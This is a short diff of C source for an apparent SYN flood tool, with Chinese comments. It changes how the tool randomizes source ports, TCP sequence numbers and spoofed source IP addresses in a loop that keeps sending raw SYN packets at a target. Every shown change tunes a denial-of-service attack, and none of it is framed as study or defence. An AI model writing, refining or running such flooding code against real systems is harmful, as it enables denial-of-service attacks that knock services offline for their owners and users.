@@ -69,7 +69,7 @@ struct pseudohdr {
 
 //[begin,end)
 inline long myrandom(int begin, int end) {
-	srand(clock());
+	srand((unsigned) time(NULL));
 	return rand() % (end - begin) + begin;
 }
 
@@ -114,9 +114,9 @@ void init_header(struct ip *ip, struct tcphdr *tcp,
 	ip->destIP = inet_addr(dst_ip);
 
 	// TCP头部数据初始化
-	tcp->sport = htons(myrandom(0, 65536));
+	tcp->sport = htons( rand()%16383 + 49152 );
 	tcp->dport = htons(dst_port);
-	tcp->seq = htonl(myrandom(0, 63353));
+	tcp->seq = htonl( rand()%90000000 + 2345 );
 	tcp->ack = 0;
 	tcp->lenres = (sizeof(struct tcphdr) / 4 << 4 | 0);
 	tcp->flag = 0x02;
@@ -152,7 +152,7 @@ send_synflood(void *addr) {
 
 	/* 处于活动状态时持续发送SYN包 */
 	while (alive) {
-		ip.sourceIP = htonl(myrandom(0,3294289523));
+		ip.sourceIP = htonl(myrandom(12323,3294289523));
 
 		//计算IP校验和
 		bzero(buf, sizeof(buf));
